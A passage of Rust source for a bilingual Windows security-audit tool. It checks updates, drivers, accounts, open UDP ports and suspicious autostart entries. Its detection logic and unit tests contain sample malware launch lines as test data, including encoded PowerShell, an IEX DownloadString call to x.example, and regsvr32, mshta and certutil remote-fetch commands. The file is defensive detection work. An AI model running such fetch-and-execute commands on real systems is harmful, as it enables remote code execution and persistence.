    match section(lectures, "REB").as_deref() {
        Some([a]) if a.eq_ignore_ascii_case("true") => alerte(
            "Redémarrage",
            Niveau::Moyen,
            tr!(
                "Des mises à jour attendent un redémarrage pour être actives.",
                "Updates are waiting for a restart to take effect."
            ),
        )
        .manuel(
            tr!("Redémarrer quand c'est pratique", "Restart when convenient"),
            &["Restart-Computer"],
        ),
        Some([a]) if a.eq_ignore_ascii_case("false") => ok(
            "Redémarrage",
            tr!("Aucun redémarrage en attente.", "No restart pending."),
        ),
        _ => illisible("Redémarrage"),
    }
}

/// (nom, identifiant) des programmes du tableau de « winget upgrade ». Les colonnes sont alignées sur l'en-tête (traduit selon
/// la langue de Windows), juste au-dessus de la ligne de tirets. Le tableau s'arrête à la première ligne qui n'a
/// pas d'identifiant ni de source (« 3 mises à niveau disponibles. », ou le second tableau des programmes épinglés).
fn lire_winget(sortie: &str) -> Option<Vec<(String, String)>> {
    // La barre de progression de winget se réécrit avec des retours chariot : seul le dernier état compte.
    let lignes: Vec<Vec<char>> = sortie
        .lines()
        .map(|l| l.rsplit('\r').next().unwrap_or("").trim_end().chars().collect())
        .collect();
    let tirets = lignes
        .iter()
        .position(|l| l.len() >= 10 && l.iter().all(|&c| c == '-' || c == '─'))?;
    let entete = lignes.get(tirets.checked_sub(1)?)?;
    let debuts: Vec<usize> = (0..entete.len())
        .filter(|&i| entete[i] != ' ' && (i == 0 || entete[i - 1] == ' '))
        .collect();
    if debuts.len() < 4 {
        return None;
    }
    let champ = |l: &[char], n: usize| -> String {
        let debut = debuts[n].min(l.len());
        let fin = debuts.get(n + 1).map_or(l.len(), |&f| f.min(l.len()));
        l[debut..fin].iter().collect::<String>().trim().to_string()
    };
    let mut noms = Vec::new();
    for l in &lignes[tirets + 1..] {
        let (id, source) = (champ(l, 1), champ(l, debuts.len() - 1));
        if id.is_empty() || id.contains(' ') || source.is_empty() || source.contains(' ') {
            break;
        }
        noms.push((champ(l, 0), id));
    }
    Some(noms)
}

/// Une commande par programme : chacun réussit ou échoue à part dans la fenêtre administrateur. App Installer, qui
/// est winget lui-même, passe en dernier : sa mise à jour coupe winget (vu dans la VM, la suite n'était pas faite).
fn commandes_winget(programmes: &[(String, String)]) -> Vec<String> {
    let mut ids: Vec<&str> = programmes.iter().map(|(_, id)| id.as_str()).collect();
    ids.sort_by_key(|id| id.eq_ignore_ascii_case("Microsoft.AppInstaller"));
    ids.iter()
        .map(|id| {
            format!(
                "winget upgrade --id '{}' --exact --accept-source-agreements --accept-package-agreements --disable-interactivity",
                id.replace('\'', "''")
            )
        })
        .collect()
}

/// Programmes installés que winget sait mettre à jour (navigateurs, 7-Zip, Discord, Steam…).
fn programmes() -> Constat {
    let Some(sortie) = ps_delai(
        "if (-not (Get-Command winget -ErrorAction SilentlyContinue)) { 'WINGET_ABSENT' } \
         else { winget upgrade --accept-source-agreements --disable-interactivity | Out-String; \"CODE=$LASTEXITCODE\" }",
        150,
    ) else {
        return illisible("Programmes");
    };
    if sortie.contains("WINGET_ABSENT") {
        return impossible("Programmes", "winget absent").manuel(
            tr!(
                "Installer « Programme d'installation d'application » depuis le Microsoft Store",
                "Install “App Installer” from the Microsoft Store"
            ),
            &["Start-Process ms-windows-store://pdp/?ProductId=9NBLGGH4NNS1"],
        );
    }
    // 0x8A150014 : aucun programme trouvé, pas une erreur.
    let code = sortie
        .rsplit_once("CODE=")
        .and_then(|(_, c)| c.trim().parse::<i64>().ok());
    let programmes = match lire_winget(&sortie) {
        Some(n) => n,
        None if matches!(code, Some(0 | -1_978_335_212)) => Vec::new(),
        None => {
            return impossible(
                "Programmes",
                &trf!(
                    "winget en erreur (code {})",
                    "winget failed (code {})",
                    code.map_or("?".into(), |c| c.to_string())
                ),
            );
        }
    };
    if programmes.is_empty() {
        return ok(
            "Programmes",
            tr!("Programmes à jour (winget).", "Programs up to date (winget)."),
        );
    }
    let noms: Vec<&str> = programmes.iter().map(|(n, _)| n.as_str()).collect();
    alerte(
        "Programmes",
        Niveau::Moyen,
        trf!(
            "{} programme(s) à mettre à jour : {}.",
            "{} program(s) to update: {}.",
            noms.len(),
            resume(&noms, 3, ", ")
        ),
    )
    .corriger(
        tr!(
            "Mettre à jour ces programmes avec winget",
            "Update these programs with winget"
        ),
        &commandes_winget(&programmes),
    )
}

/// Périphériques en erreur dans le Gestionnaire de périphériques (pilote absent, qui ne démarre pas…).
/// Code 22 (désactivé à la main) écarté : un choix, pas une panne. Sans nom, l'identifiant matériel
/// (PCI\VEN_1AF4&DEV_1045…) le remplace : c'est lui qu'on cherche sur Internet pour trouver le pilote.
fn peripheriques(lectures: Option<&str>) -> Constat {
    let Some(lignes) = section(lectures, "PNP") else {
        return illisible("Périphériques");
    };
    let en_panne: Vec<String> = lignes
        .iter()
        .filter_map(|l| l.split_once('|'))
        // Le périphérique fw_cfg des VM QEMU n'a jamais de pilote, et n'en a pas besoin (vu dans la VM de test).
        .filter(|(_, nom)| !nom.contains("QEMU0002"))
        .map(|(code, nom)| {
            let nom = if nom.trim().is_empty() {
                tr!("Périphérique inconnu", "Unknown device")
            } else {
                nom.trim()
            };
            match code {
                "28" | "1" => trf!("{nom} (pas de pilote)", "{nom} (no driver)"),
                _ => trf!("{nom} (erreur {code})", "{nom} (error {code})"),
            }
        })
        .collect();
    if en_panne.is_empty() {
        return ok(
            "Périphériques",
            tr!(
                "Tous les périphériques ont un pilote qui fonctionne.",
                "Every device has a working driver."
            ),
        );
    }
    alerte(
        "Périphériques",
        Niveau::Moyen,
        trf!(
            "{} périphérique(s) sans pilote ou en erreur : {}.", "{} device(s) without a driver or in error: {}.",
            en_panne.len(),
            resume(&en_panne, 3, ", ")
        ),
    )
    .manuel(
        tr!("Chercher le pilote dans Windows Update > Options avancées > Mises à jour facultatives, sinon sur le site du fabricant", "Look for the driver in Windows Update > Advanced options > Optional updates, otherwise on the manufacturer's website"),
        &["Start-Process ms-settings:windowsupdate-optionalupdates", "Start-Process devmgmt.msc"],
    )
}

/// Outil du fabricant qui installe et tient à jour le pilote de cette carte graphique, et sa page officielle.
/// `None` pour une carte virtuelle ou de base (VM, Bureau à distance) : pas de pilote de fabricant à chercher.
pub fn pilote_fabricant(carte: &str) -> Option<(&'static str, &'static str)> {
    let nom = carte.to_lowercase();
    if nom.contains("nvidia") {
        Some(("NVIDIA App", "https://www.nvidia.com/fr-fr/software/nvidia-app/"))
    } else if nom.contains("amd") || nom.contains("radeon") {
        Some((
            "AMD Software Adrenalin",
            "https://www.amd.com/fr/support/download/drivers.html",
        ))
    } else if nom.contains("intel") {
        Some((
            "Intel Driver & Support Assistant",
            "https://www.intel.com/content/www/fr/fr/support/detect.html",
        ))
    } else {
        None
    }
}

/// Âge du pilote de chaque carte graphique NVIDIA, AMD ou Intel. Son fabricant le publie souvent bien avant
/// Windows Update, et un pilote vieux d'un an rate des correctifs de sécurité et des optimisations des jeux.
fn cartes_graphiques(lectures: Option<&str>) -> Vec<Constat> {
    let Some(lignes) = section(lectures, "GPU") else {
        return vec![illisible("Carte graphique")];
    };
    lignes
        .iter()
        .filter_map(|l| {
            let mut c = l.splitn(3, '|');
            let (nom, version, jours) = (c.next()?.trim(), c.next()?.trim(), c.next()?.trim().parse::<u32>().ok());
            let (outil, lien) = pilote_fabricant(nom)?;
            let manuel = trf!("Mettre le pilote à jour avec {outil}", "Update the driver with {outil}");
            let ouvrir = format!("Start-Process {lien}");
            Some(match jours {
                Some(j) if j > 180 => alerte(
                    "Carte graphique",
                    Niveau::Moyen,
                    trf!(
                        "{nom} : pilote {version} vieux de {j} jours.",
                        "{nom}: driver {version}, {j} days old."
                    ),
                )
                .manuel(manuel, &[&ouvrir]),
                Some(j) => ok(
                    "Carte graphique",
                    trf!(
                        "{nom} : pilote {version} de {j} jours.",
                        "{nom}: driver {version}, {j} days old."
                    ),
                ),
                None => ok(
                    "Carte graphique",
                    trf!("{nom} : pilote {version}.", "{nom}: driver {version}."),
                ),
            })
        })
        .collect()
}

/// Signatures de Defender : la même règle pour l'audit et pour `sentinel maj`.
fn signatures(age: u64) -> Constat {
    if age > 3 {
        alerte(
            "Signatures",
            Niveau::Moyen,
            trf!(
                "Signatures antivirus vieilles de {age} jours.",
                "Antivirus signatures {age} days old."
            ),
        )
        .corriger(
            tr!("Mettre à jour les signatures", "Update the signatures"),
            &["Update-MpSignature"],
        )
    } else {
        ok(
            "Signatures",
            tr!("Signatures de Defender à jour.", "Defender signatures up to date."),
        )
    }
}

/// `None` avec un antivirus tiers : Defender n'a alors pas de signatures à tenir à jour.
fn signatures_defender(lectures: Option<&str>) -> Option<Constat> {
    let age = section(lectures, "SIG")?.first()?.trim().parse().ok()?;
    Some(signatures(age))
}

/// Tout ce qui doit être à jour : Windows, ses pilotes, les programmes, Defender. Windows Update et winget (jusqu'à
/// deux minutes chacun) tournent en parallèle pendant les lectures rapides.
/// `seulement` : les catégories à revérifier (après une installation) ; les lectures rapides sont toujours faites.
pub fn mises_a_jour_completes(seulement: Option<&[&str]>) -> Vec<Constat> {
    let voulu = |categories: &[&str]| seulement.is_none_or(|s| categories.iter().any(|c| s.contains(c)));
    std::thread::scope(|portee| {
        let wu = voulu(&["Windows Update", "Pilotes"]).then(|| portee.spawn(windows_update));
        let winget = voulu(&["Programmes"]).then(|| portee.spawn(programmes));
        let lectures = lectures_rapides();
        let l = lectures.as_deref();
        let mut constats = wu.map(|t| t.join().unwrap_or_default()).unwrap_or_default();
        constats.push(redemarrage_en_attente(l));
        constats.extend(signatures_defender(l));
        constats.extend(winget.map(|t| t.join().unwrap_or_else(|_| illisible("Programmes"))));
        constats.push(peripheriques(l));
        constats.extend(cartes_graphiques(l));
        constats
    })
}

/// Ports UDP ouverts sur le réseau. Windows en ouvre beaucoup lui-même (découverte, heure, VPN) : on ne garde
/// que les services à risque et ceux des programmes installés, hors ports éphémères (réponses de clients).
fn ports_udp(pare_feu_actif: bool, ip_lan: Option<&str>) -> Vec<Constat> {
    let Some(liste) = ps(
        "Get-NetUDPEndpoint | ForEach-Object { \"$($_.LocalAddress)|$($_.LocalPort)|$((Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName)\" }",
    ) else {
        return vec![illisible("Ports en écoute")];
    };
    lire_ports_udp(&liste, pare_feu_actif, ip_lan)
}

fn lire_ports_udp(liste: &str, pare_feu_actif: bool, ip_lan: Option<&str>) -> Vec<Constat> {
    let systeme = ["svchost", "lsass", "wininit", "services", "spoolsv", "System", "Idle", ""];
    let mut vus = Vec::new();
    let mut constats = Vec::new();
    for l in liste.lines() {
        let mut c = l.trim().splitn(3, '|');
        let (Some(adresse), Some(Ok(port)), programme) =
            (c.next(), c.next().map(str::parse::<u16>), c.next().unwrap_or("").trim())
        else {
            continue;
        };
        let expose = matches!(adresse, "0.0.0.0" | "::") || ip_lan == Some(adresse);
        if !expose || port >= 49152 || vus.contains(&port) {
            continue;
        }
        let i = info_port(port);
        let du_systeme = systeme.contains(&programme);
        if du_systeme && i.niveau == Niveau::Info {
            continue;
        }
        vus.push(port);
        let programme = if programme.is_empty() { tr!("programme inconnu", "unknown program") } else { programme };
        constats.push(alerte(
            "Ports en écoute",
            super::niveau_expose(pare_feu_actif, i.niveau),
            trf!(
                "{port}/udp ({}) ouvert par « {programme} ». {}",
                "{port}/udp ({}) opened by “{programme}”. {}",
                i.service,
                i.conseil
            ),
        ));
    }
    constats
}

/// Comptes locaux : invité, administrateur intégré, comptes sans mot de passe exigé, et la règle qui empêche
/// d'utiliser un compte sans mot de passe depuis le réseau. Une seule lecture PowerShell, en sections.
fn comptes() -> Vec<Constat> {
    let sortie = ps(
        "try { Get-LocalUser | ForEach-Object { \"USR|$($_.Enabled)|$($_.PasswordRequired)|$($_.SID.Value)|$($_.Name)\" }; 'USR_FIN' } catch {}; \
         try { 'MOI|' + [Security.Principal.WindowsIdentity]::GetCurrent().User.Value; 'MOI_FIN' } catch {}; \
         try { 'LBP|' + (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').LimitBlankPasswordUse; 'LBP_FIN' } catch {}",
    );
    let Some(utilisateurs) = section(sortie.as_deref(), "USR") else {
        return vec![illisible("Comptes")];
    };
    let moi = section(sortie.as_deref(), "MOI").and_then(|l| l.first().map(|s| s.trim().to_string()));
    let lbp = section(sortie.as_deref(), "LBP").and_then(|l| l.first().and_then(|s| s.trim().parse().ok()));
    juger_comptes(&utilisateurs, moi.as_deref(), lbp)
}

fn juger_comptes(utilisateurs: &[&str], moi: Option<&str>, lbp: Option<u32>) -> Vec<Constat> {
    let mut constats = Vec::new();
    for u in utilisateurs {
        let c: Vec<&str> = u.trim().splitn(4, '|').collect();
        let [actif, exige, sid, nom] = c[..] else { continue };
        if !actif.eq_ignore_ascii_case("true") {
            continue;
        }
        let nom_ps = nom.replace('\'', "''");
        if sid.ends_with("-501") {
            constats.push(
                alerte(
                    "Comptes",
                    Niveau::Eleve,
                    trf!("Compte invité « {nom} » activé.", "Guest account “{nom}” enabled."),
                )
                .corriger(
                    tr!("Désactiver le compte invité", "Disable the guest account"),
                    &[&format!("Disable-LocalUser -Name '{nom_ps}'")],
                ),
            );
            continue;
        }
        if sid.ends_with("-500") {
            let constat = alerte(
                "Comptes",
                Niveau::Moyen,
                trf!(
                    "Compte Administrateur intégré « {nom} » activé : son nom est connu de tous, c'est la cible préférée des attaques par mot de passe.",
                    "Built-in Administrator account “{nom}” enabled: its name is known to everyone, it is the favorite target of password attacks."
                ),
            );
            // On ne coupe pas le compte avec lequel on travaille.
            constats.push(if moi == Some(sid) {
                constat.manuel(
                    tr!(
                        "Créer ton propre compte administrateur, puis désactiver celui-ci",
                        "Create your own administrator account, then disable this one"
                    ),
                    &["Start-Process ms-settings:otherusers"],
                )
            } else {
                constat.corriger(
                    tr!("Désactiver le compte Administrateur intégré", "Disable the built-in Administrator account"),
                    &[&format!("Disable-LocalUser -Name '{nom_ps}'")],
                )
            });
        }
        if exige.eq_ignore_ascii_case("false") {
            constats.push(
                alerte(
                    "Comptes",
                    Niveau::Moyen,
                    trf!(
                        "Le compte « {nom} » n'exige pas de mot de passe : il peut s'ouvrir sans rien taper.",
                        "The “{nom}” account does not require a password: it may open without typing anything."
                    ),
                )
                .manuel(
                    trf!("Donner un mot de passe à « {nom} »", "Give “{nom}” a password"),
                    &["Start-Process ms-settings:signinoptions"],
                ),
            );
        }
    }
    if lbp == Some(0) {
        constats.push(
            alerte(
                "Comptes",
                Niveau::Eleve,
                tr!(
                    "Les comptes sans mot de passe sont utilisables depuis le réseau (LimitBlankPasswordUse = 0).",
                    "Accounts without a password can be used from the network (LimitBlankPasswordUse = 0)."
                ),
            )
            .corriger(
                tr!(
                    "Réserver les comptes sans mot de passe à l'écran de connexion",
                    "Restrict password-less accounts to the sign-in screen"
                ),
                &["Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name LimitBlankPasswordUse -Value 1"],
            ),
        );
    }
    if constats.is_empty() {
        constats.push(ok(
            "Comptes",
            tr!(
                "Compte invité et Administrateur intégré désactivés, chaque compte exige un mot de passe.",
                "Guest and built-in Administrator accounts disabled, every account requires a password."
            ),
        ));
    }
    constats
}

/// Programme et arguments d'une ligne de commande Windows (« "C:\Program Files\x.exe" -a », « x.exe -a »,
/// « C:\Program Files\x.exe -a » sans guillemets).
fn decouper_commande(ligne: &str) -> (String, String) {
    let ligne = ligne.trim();
    if let Some(reste) = ligne.strip_prefix('"')
        && let Some((exe, args)) = reste.split_once('"')
    {
        return (exe.to_string(), args.trim().to_string());
    }
    let bas = ligne.to_lowercase();
    if let Some(i) = bas.find(".exe") {
        let (exe, args) = ligne.split_at(i + 4);
        return (exe.to_string(), args.trim().to_string());
    }
    match ligne.split_once(' ') {
        Some((exe, args)) => (exe.to_string(), args.trim().to_string()),
        None => (ligne.to_string(), String::new()),
    }
}

/// Pourquoi ce programme lancé automatiquement (tâche planifiée, clé Run, dossier Démarrage) ressemble à un
/// malware, ou `None`. Seules des formes précises sont retenues : les programmes installés normalement n'y tombent pas.
fn lancement_suspect(exe: &str, args: &str) -> Option<&'static str> {
    let exe = exe.trim().trim_matches('"').to_lowercase().replace('/', "\\");
    let args = args.to_lowercase();
    let tout = format!("{exe} {args}");
    let temporaire = |t: &str| {
        ["\\appdata\\local\\temp\\", "%temp%", "%tmp%", "\\windows\\temp\\"]
            .iter()
            .any(|d| t.contains(d))
    };
    let public = |t: &str| ["\\users\\public\\", "\\$recycle.bin\\", "%public%"].iter().any(|d| t.contains(d));
    let programme = exe.rsplit('\\').next().unwrap_or(&exe).trim_end_matches(".exe");
    if temporaire(&exe) {
        return Some(tr!("programme lancé depuis un dossier temporaire", "program started from a temporary folder"));
    }
    if public(&exe) {
        return Some(tr!(
            "programme rangé dans le dossier Public ou la corbeille",
            "program stored in the Public folder or the recycle bin"
        ));
    }
    let jetons: Vec<String> = args
        .split_whitespace()
        .map(|j| j.trim_matches('"').replacen('/', "-", 1))
        .collect();
    let a = |m: &str| jetons.iter().any(|j| j == m);
    match programme {
        "powershell" | "pwsh" => {
            let cache = jetons
                .iter()
                .any(|j| j == "-e" || j == "-ec" || (j.starts_with("-en") && "-encodedcommand".starts_with(j.as_str())));
            if cache {
                return Some(tr!("commande PowerShell cachée en base64", "PowerShell command hidden in base64"));
            }
            let execute = ["iex", "invoke-expression"].iter().any(|m| args.contains(m));
            let telecharge = ["downloadstring", "downloadfile", "invoke-webrequest", "iwr ", "net.webclient", "invoke-restmethod", "irm "]
                .iter()
                .any(|m| args.contains(m));
            if execute && telecharge {
                return Some(tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                ));
            }
        }
        "mshta" if ["http:", "https:", "javascript:", "vbscript:"].iter().any(|m| args.contains(m)) => {
            return Some(tr!("mshta lance un script venu d'Internet", "mshta runs a script from the Internet"));
        }
        "regsvr32" if args.contains("scrobj.dll") || args.contains("-i:http") || args.contains("/i:http") => {
            return Some(tr!("regsvr32 charge un script distant", "regsvr32 loads a remote script"));
        }
        "rundll32" if args.contains("javascript:") => {
            return Some(tr!("rundll32 exécute du JavaScript", "rundll32 runs JavaScript"));
        }
        "certutil" if a("-urlcache") || a("-decode") => {
            return Some(tr!(
                "certutil détourné pour télécharger ou décoder un fichier",
                "certutil misused to download or decode a file"
            ));
        }
        "bitsadmin" if a("-transfer") => {
            return Some(tr!("bitsadmin détourné pour télécharger un fichier", "bitsadmin misused to download a file"));
        }
        _ => {}
    }
    // Interpréteurs et outils système qui lancent un script ou une bibliothèque rangés dans un dossier temporaire ou public.
    let relais = ["wscript", "cscript", "mshta", "rundll32", "regsvr32", "cmd", "powershell", "pwsh"];
    if relais.contains(&programme) && (temporaire(&tout) || public(&tout)) {
        return Some(tr!(
            "script ou bibliothèque lancé depuis un dossier temporaire ou public",
            "script or library started from a temporary or public folder"
        ));
    }
    if ["wscript", "cscript"].contains(&programme) && args.contains("\\appdata\\") {
        return Some(tr!(
            "script caché dans les données d'application, lancé automatiquement",
            "script hidden in application data, started automatically"
        ));
    }
    None
}

/// Ce qui se lance tout seul hors de Windows : tâches planifiées (hors \Microsoft\), clés Run et RunOnce,
/// dossiers Démarrage. Une seule lecture PowerShell, en sections.
fn persistance() -> Vec<Constat> {
    let sortie = ps(
        "try { Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' -and $_.TaskPath -notlike '\\Microsoft\\*' } | ForEach-Object { $t = $_; \
         $t.Actions | Where-Object { $_.Execute } | ForEach-Object { \"TCH|$($t.TaskPath)|$($t.TaskName)|$($_.Execute)|$($_.Arguments)\" } }; 'TCH_FIN' } catch {}; \
         try { foreach ($c in 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce', \
         'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce', \
         'HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run') { $p = Get-ItemProperty $c -ErrorAction SilentlyContinue; \
         if ($p) { $p.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | ForEach-Object { \"RUN|$c|$($_.Name)|$($_.Value)\" } } }; 'RUN_FIN' } catch {}; \
         try { $w = New-Object -ComObject WScript.Shell; foreach ($d in [Environment]::GetFolderPath('Startup'), [Environment]::GetFolderPath('CommonStartup')) { \
         Get-ChildItem $d -File -ErrorAction SilentlyContinue | Where-Object Name -ne 'desktop.ini' | ForEach-Object { \
         $cible = if ($_.Extension -eq '.lnk') { $r = $w.CreateShortcut($_.FullName); '\"' + $r.TargetPath + '\" ' + $r.Arguments } else { '\"' + $_.FullName + '\"' }; \
         \"DEM|$($_.FullName)|$cible\" } }; 'DEM_FIN' } catch {}",
    );
    let taches = section(sortie.as_deref(), "TCH");
    let run = section(sortie.as_deref(), "RUN");
    let demarrage = section(sortie.as_deref(), "DEM");
    if taches.is_none() && run.is_none() && demarrage.is_none() {
        return vec![illisible("Persistance")];
    }
    juger_persistance(
        &taches.unwrap_or_default(),
        &run.unwrap_or_default(),
        &demarrage.unwrap_or_default(),
    )
}

fn juger_persistance(taches: &[&str], run: &[&str], demarrage: &[&str]) -> Vec<Constat> {
    let ps_texte = |s: &str| s.replace('\'', "''");
    let mut constats = Vec::new();
    for t in taches {
        let c: Vec<&str> = t.trim().splitn(4, '|').collect();
        let [chemin, nom, exe, args] = c[..] else { continue };
        if let Some(raison) = lancement_suspect(exe, args) {
            constats.push(
                alerte(
                    "Persistance",
                    Niveau::Eleve,
                    trf!(
                        "Tâche planifiée suspecte « {chemin}{nom} » : {raison} ({exe} {args}).",
                        "Suspicious scheduled task “{chemin}{nom}”: {raison} ({exe} {args})."
                    ),
                )
                .corriger(
                    trf!("Désactiver la tâche « {nom} » (réactivable)", "Disable the “{nom}” task (can be turned back on)"),
                    &[&format!(
                        "Disable-ScheduledTask -TaskPath '{}' -TaskName '{}' | Out-Null",
                        ps_texte(chemin),
                        ps_texte(nom)
                    )],
                ),
            );
        }
    }
    for r in run {
        let c: Vec<&str> = r.trim().splitn(3, '|').collect();
        let [cle, nom, valeur] = c[..] else { continue };
        let (exe, args) = decouper_commande(valeur);
        if let Some(raison) = lancement_suspect(&exe, &args) {
            constats.push(
                alerte(
                    "Persistance",
                    Niveau::Eleve,
                    trf!(
                        "Lancement automatique suspect « {nom} » ({cle}) : {raison} ({valeur}).",
                        "Suspicious autostart “{nom}” ({cle}): {raison} ({valeur})."
                    ),
                )
                .corriger(
                    trf!("Retirer « {nom} » du démarrage", "Remove “{nom}” from startup"),
                    &[&format!(
                        "Remove-ItemProperty -Path '{}' -Name '{}'",
                        ps_texte(cle),
                        ps_texte(nom)
                    )],
                ),
            );
        }
    }
    for d in demarrage {
        let Some((fichier, cible)) = d.trim().split_once('|') else { continue };
        let (exe, args) = decouper_commande(cible);
        if let Some(raison) = lancement_suspect(&exe, &args) {
            constats.push(
                alerte(
                    "Persistance",
                    Niveau::Eleve,
                    trf!(
                        "Raccourci suspect dans le dossier Démarrage « {fichier} » : {raison} ({cible}).",
                        "Suspicious shortcut in the Startup folder “{fichier}”: {raison} ({cible})."
                    ),
                )
                .corriger(
                    trf!("Supprimer « {fichier} »", "Delete “{fichier}”"),
                    &[&format!("Remove-Item -LiteralPath '{}'", ps_texte(fichier))],
                ),
            );
        }
    }
    if constats.is_empty() {
        constats.push(ok(
            "Persistance",
            trf!(
                "{} tâche(s) planifiée(s) hors Microsoft et {} programme(s) au démarrage, aucun suspect.",
                "{} non-Microsoft scheduled task(s) and {} startup program(s), none suspicious.",
                taches.len(),
                run.len() + demarrage.len()
            ),
        ));
    }
    constats
}

pub fn auditer() -> Audit {
    let feu = pare_feu();
    let feu_actif = feu.probleme.is_none();
    let ip_lan = crate::scan::reseau_local().map(|l| l.1.to_string());
    let mut constats = vec![feu];
    constats.extend(antivirus());
    constats.extend(ports_ecoute(feu_actif, ip_lan.as_deref()));
    constats.extend(ports_udp(feu_actif, ip_lan.as_deref()));
    constats.extend(smb1());
    constats.push(bureau_distance());
    constats.push(uac());
    constats.push(mises_a_jour());
    constats.push(chiffrement());
    constats.extend(comptes());
    constats.extend(persistance());
    constats.extend(wifi());
    constats.extend(super::dns::dns());
    constats.extend(super::certificats::certificats());
    constats.extend(super::extensions::extensions());
    Audit {
        systeme: NOM,
        score: score(&constats),
        constats,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lancements_suspects() {
        let s = |ligne: &str| {
            let (exe, args) = decouper_commande(ligne);
            lancement_suspect(&exe, &args).is_some()
        };
        // Programmes installés normalement : rien à signaler.
        assert!(!s(r#""C:\Program Files\Steam\steam.exe" -silent"#));
        assert!(!s(r"C:\Users\alice\AppData\Local\Discord\Update.exe --processStart Discord.exe"));
        assert!(!s(r"C:\Program Files\Mozilla Firefox\firefox.exe -os-autostart"));
        assert!(!s(r#""C:\Program Files\PowerShell\7\pwsh.exe" -ExecutionPolicy Bypass -File C:\Scripts\sauvegarde.ps1"#));
        assert!(!s(r"%windir%\system32\rundll32.exe printui.dll,PrintUIEntry"));
        // Formes de malware.
        assert!(s(r"C:\Users\alice\AppData\Local\Temp\svch0st.exe"));
        assert!(s(r"C:\Users\Public\update.exe /q"));
        assert!(s(r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"));
        assert!(s(r"powershell -e SQBFAFgA"));
        assert!(s(r"powershell.exe /EncodedCommand SQBFAFgA"));
        assert!(s(r#"powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')""#));
        assert!(s(r"mshta.exe https://x.example/a.hta"));
        assert!(s(r"regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll"));
        assert!(s(r"certutil.exe -urlcache -split -f http://x.example/a.exe a.exe"));
        assert!(s(r"wscript.exe C:\Users\alice\AppData\Roaming\x\run.vbs"));
        assert!(s(r"rundll32.exe C:\Users\alice\AppData\Local\Temp\a.dll,Start"));
        assert_eq!(
            decouper_commande(r"C:\Program Files\App\app.exe /min"),
            (r"C:\Program Files\App\app.exe".to_string(), "/min".to_string())
        );
    }

    #[test]
    fn persistance_jugee() {
        let taches = [r"\|Mise a jour|C:\Users\alice\AppData\Local\Temp\a.exe|", r"\Mozilla\|Firefox Default Browser Agent|C:\Program Files\Mozilla Firefox\default-browser-agent.exe|do-task"];
        let c = juger_persistance(&taches, &[], &[]);
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].probleme, Some(Niveau::Eleve));
        assert!(c[0].correctif.as_ref().unwrap().commandes[0].contains("Disable-ScheduledTask -TaskPath '\\' -TaskName 'Mise a jour'"));
        let run = [r#"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|Steam|"C:\Program Files (x86)\Steam\steam.exe" -silent"#];
        let c = juger_persistance(&[], &run, &[]);
        assert!(c.len() == 1 && c[0].probleme.is_none());
    }

    #[test]
    fn comptes_juges() {
        let utilisateurs = [
            "True|True|S-1-5-21-1-1-1-1001|alice",
            "False|False|S-1-5-21-1-1-1-501|Invité",
            "False|True|S-1-5-21-1-1-1-500|Administrateur",
        ];
        let c = juger_comptes(&utilisateurs, Some("S-1-5-21-1-1-1-1001"), Some(1));
        assert!(c.len() == 1 && c[0].probleme.is_none());
        let utilisateurs = [
            "True|False|S-1-5-21-1-1-1-1002|enfant",
            "True|False|S-1-5-21-1-1-1-501|Invité",
            "True|True|S-1-5-21-1-1-1-500|Administrateur",
        ];
        let c = juger_comptes(&utilisateurs, Some("S-1-5-21-1-1-1-500"), Some(0));
        let niveaux: Vec<_> = c.iter().map(|c| c.probleme).collect();
        assert_eq!(
            niveaux,
            [Some(Niveau::Moyen), Some(Niveau::Eleve), Some(Niveau::Moyen), Some(Niveau::Eleve)]
        );
        // Administrateur intégré utilisé en ce moment : conseil, pas de désactivation automatique.
        assert!(c[2].correctif.as_ref().is_some_and(|k| !k.automatique));
    }

    #[test]
    fn ports_udp_retenus() {
        let liste = "0.0.0.0|5353|svchost\n0.0.0.0|123|svchost\n0.0.0.0|161|snmp\n127.0.0.1|1900|svchost\n0.0.0.0|27036|steam\n0.0.0.0|60000|chrome\n0.0.0.0|161|snmp";
        let c = lire_ports_udp(liste, true, None);
        assert_eq!(c.len(), 2);
        assert!(c[0].message.starts_with("161/udp"));
        assert!(c[1].message.starts_with("27036/udp"));
    }

    #[test]
    fn jamais_couper_le_bureau_a_distance_qu_on_utilise() {
        // SAFETY (test) : variable propre au processus de test.
        unsafe { std::env::set_var("SESSIONNAME", "RDP-Tcp#3") };
        assert!(session_a_distance());
    }

    #[test]
    fn tableau_de_winget() {
        // Forme de la sortie de winget en français, barre de progression comprise (à confirmer dans la VM).
        let sortie = "   - \r   \\ \r\r\n\
Nom                         ID                       Version      Disponible   Source\r\n\
-------------------------------------------------------------------------------------\r\n\
Mozilla Firefox (x64 fr)    Mozilla.Firefox.fr       130.0        131.0.2      winget\r\n\
7-Zip 24.07 (x64)           7zip.7zip                24.07        24.08        winget\r\n\
Discord                     Discord.Discord          1.0.9163     1.0.9170     winget\r\n\
3 mises à niveau disponibles.\r\n\
\r\n\
Le package suivant a une mise à niveau, mais il nécessite un ciblage explicite :\r\n\
Nom    ID        Version Disponible Source\r\n\
------------------------------------------\r\n\
Steam  Valve.Steam 2.10  2.11       winget\r\n\
CODE=0";
        let noms: Vec<String> = lire_winget(sortie).unwrap().into_iter().map(|(n, _)| n).collect();
        assert_eq!(noms, ["Mozilla Firefox (x64 fr)", "7-Zip 24.07 (x64)", "Discord"]);
